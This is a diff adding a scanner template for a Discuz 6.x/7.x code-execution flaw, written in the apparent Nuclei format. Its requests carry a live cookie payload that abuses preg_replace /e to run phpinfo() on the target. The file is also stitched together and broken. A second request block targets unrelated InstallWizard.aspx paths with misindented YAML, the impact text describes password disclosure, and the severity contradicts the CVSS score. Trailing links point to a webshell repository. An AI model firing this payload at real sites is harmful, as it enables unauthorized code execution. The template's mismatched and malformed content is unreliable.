@@ -1,1 +1,87 @@
 
+id: ZB-Discuz-6x7xRCE
+
+info:
+  name: Discuz 7.x/6.x 全局变量防御绕过导致代码执行
+  author: Discuz 7.x/6.x 全局变量防御绕过导致代码执行
+  severity: high
+  description: |
+    Discuz 7.x/6.x 全局变量防御绕过导致代码执行
+  impact: |
+    The vulnerability can lead to unauthorized access to user passwords, compromising the confidentiality of user accounts.
+  remediation: 
+  reference:
+    - https://www.cnblogs.com/NoCirc1e/p/16283344.html
+    - https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Discuz%207.x6.x%20%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E9%98%B2%E5%BE%A1%E7%BB%95%E8%BF%87%E5%AF%BC%E8%87%B4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C.md
+
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
+    cvss-score: 5.3
+    cve-id: 
+    epss-score: 0.96314
+    epss-percentile: 0.9944
+
+  metadata:
+    verified: true
+    max-request: 2
+    vendor: Discuz
+    product: Discuz
+
+  tags: cve,discuz,Discuz
+
+http:
+  - raw:
+      - |
+        GET /viewthread.php?tid=2&extra=page%3D1 HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+
+      - |
+        GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+    
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'phpinfo'
+
+requests:
+  - method: GET 
+    path:
+      - "{{BaseURL}}/Install/InstallWizard.aspx?__VIEWSTATE=&culture=en-US&executeinstall"
+       - "{{BaseURL}}/Install/InstallWizard.aspx?__VIEWSTATE=&culture=en-US&executeinstall"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo();
+    
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'phpinfo'
+  
+    
+# digest: 4b0a00483046022100f1a8859b2be34845c6e9ff983c9ab9fc1741ee2e59af7319158de1e37c2002850221009b6444bdf0c4f9f9c9da30901088c17b893d690461a859cb5a97e2488a963ce2:922c64590222798bb761d5b6d8e72950
+
+
+https://www.cnblogs.com/xiaoyunxiaogang/p/17219281.html
+https://github.com/Boogipop/CVE-2023-22527-Godzilla-MEMSHELL
